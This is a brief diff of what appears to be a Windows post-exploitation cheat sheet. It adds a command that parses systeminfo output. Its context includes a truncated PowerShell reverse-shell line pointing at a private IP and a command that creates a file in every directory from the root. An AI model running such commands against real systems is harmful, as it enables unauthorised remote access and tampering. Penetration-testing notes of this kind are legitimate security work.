@@ -24,6 +24,8 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1
 # Can you write here?
 cd / ;Get-ChildItem -Recurse -Directory | ForEach-Object {New-Item -ItemType file -Path "$($_.FullName)" -Name "I CAN WRITE HERE!" }
 
+# Systeminfo - parsed
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 
 
 - ---] Nishang
